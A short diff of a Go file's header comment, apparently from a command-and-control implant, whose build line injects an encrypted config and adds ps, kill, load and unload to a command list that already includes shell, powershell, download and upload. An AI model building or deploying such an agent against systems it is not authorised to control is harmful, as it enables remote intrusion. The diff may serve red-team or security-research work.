@@ -2,7 +2,7 @@
 //
 // Build with config injected:
 //
-//	go build -ldflags "-X main.cfgBlob=.. -X main.cfgKey=.. -X main.cfgNonce=.. -X main.includedCommands=shell,powershell,sleep,ls,download,upload,rm,mkdir,exit"
+//	go build -ldflags "-X main.cfgBlob=.. -X main.cfgKey=.. -X main.cfgNonce=.. -X main.includedCommands=shell,powershell,sleep,ls,download,upload,rm,mkdir,ps,kill,load,unload,exit"
 package main
 
 import (
